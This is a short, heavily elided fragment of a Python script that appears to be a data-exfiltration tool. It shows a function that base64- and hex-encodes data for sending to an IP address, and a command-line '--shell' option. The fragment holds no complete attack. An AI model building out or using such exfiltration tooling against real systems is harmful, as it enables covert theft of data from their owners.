...
def exfiltrateLastBytes(data, ip, src, verbose):
    ...
    string = base64.b64encode(data).encode("hex") + b"0a"
    #string2 = codecs.encode(data, encoding='hex') + b"0a"
    #string = base64.b64encode(string2)
...
if __name__ == "__main__":
    ...
    parser.add_argument('-s', '--shell', help='use shell option', required=False, action='store_true')
